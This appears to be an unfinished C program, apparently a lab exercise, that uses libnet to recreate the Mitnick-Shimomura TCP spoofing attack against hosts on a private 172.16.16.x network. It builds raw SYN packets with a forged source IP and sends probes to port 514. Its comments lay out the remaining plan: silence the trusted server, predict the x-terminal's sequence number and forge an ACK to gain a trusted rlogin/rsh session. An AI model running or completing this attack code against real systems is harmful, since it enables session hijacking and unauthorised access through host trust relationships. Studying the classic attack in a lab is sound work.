#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
//#include <common.h>
#include <unistd.h>


//eth level data -> do I need this??
#define KEVIN_MAC "02:00:ac:10:10:02"
#define SERVER_MAC "02:00:ac:10:10:03"
#define XTERMINAL_MAC "02:00:ac:10:10:04"

//ip level data
char * KEVIN_IP = "172.16.16.2";
char * SERVER_IP = "172.16.16.3";
char * XTERMINAL_IP = "172.16.16.4";

//tcp level data
#define PORT 513
#define PAYLOAD_DOS "disable"
#define PAYLOAD_RST "enable"

//function definitions
int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);

//shimomura you're doomed
int main (void)
{
	//initialize libnett stuff
	char errbuff[LIBNET_ERRBUF_SIZE];
	libnet_t * l;

	l = libnet_init(LIBNET_RAW4, "eth0", errbuff);
	if (l == NULL)
	{
		printf("libnet init error\n");
		exit(EXIT_FAILURE);
	}

	libnet_seed_prand(l);
	//start DOS part
	//ip conversion
	u_long kevin_ip = libnet_name2addr4(l, KEVIN_IP, LIBNET_DONT_RESOLVE);
  u_long xterm_ip = libnet_name2addr4(l, XTERMINAL_IP, LIBNET_DONT_RESOLVE);

	if (xterm_ip == (u_long) -1)
	{
		printf("error in xterm ip conversion\n");
		exit(EXIT_FAILURE);
	}
	if (kevin_ip == (u_long) -1)
	{
		printf("error in kevin ip conversion\n");
		exit(EXIT_FAILURE);
	}

	//dos the server

	int i;
	printf("Starting probing\n");
	for (i = 0; i < 15; i++)
	{
		//craft and send 10 packets with "disable" payload
		printf("probe\n");
		send_syn(514, NULL, 0, l, xterm_ip, kevin_ip);
	}
	//now the server will ignore syn acks, that's exactly what I need because

	//I will send spoofed syn
	//The xterminal will send real synack to the server
	//I will respond with spoofed ack cause I know the server seq num
	//will have a trusted connection on the xterminal

	//contact xterminal to figure out next seq #


	//impersonate trusted server


	exit(EXIT_SUCCESS);
}


int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
{

	libnet_ptag_t t;
	//build syn
	t = libnet_build_tcp(
		libnet_get_prand(LIBNET_PRu16), //sp source port
		dest_port,											//dp destinatin port
		libnet_get_prand(LIBNET_PRu32), //sequence number
    0, 															//ack number, can I send whatever?
    TH_SYN,													//control bit SYN
		2048, 													//window size, random is ok?
		0,															//checksum, if 0 libnet autofills
		10,															//urgent pointer
		LIBNET_TCP_H + payload_s,				//len = tcp header + payload size
		payload,												//payload
		payload_s,											//payload size
		l,															//pointer to libnet context
		0																//protocol tag, 0 to build a new one
	);

	if (t == -1)
	{
		printf("error while crafting tcp syn\n");
		exit(EXIT_FAILURE);
	}


	//build ip fragment containing syn
	t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, //size of the ip packet ,
		0,																				//tos, type of service
		0,																				//id, ip identification
		0,																				//fragmentation bits and offset
		libnet_get_prand(LIBNET_PR8),							//ttl
    IPPROTO_TCP,															//upper protocol
    0,																				//checksum, 0 to autofill
    kevin_ip,																	//src, I use a random fake ip
    server_ip,																//destination
    NULL,																			//payload
    0,																				//payload len
		l,																				//libnet context
		0																					//protocol tag
	);

	if (t == -1)
	{
		printf("error while crafting ip header\n");
		exit(EXIT_FAILURE);
	}

	//send packet
	int success = libnet_write(l);
	if (success == -1)
	{
		printf("error while sending packet\n");
		exit(EXIT_FAILURE);
	}
	else
	{
		printf("sent %d\n", success);
	}

	libnet_clear_packet(l);
	return 1;
}
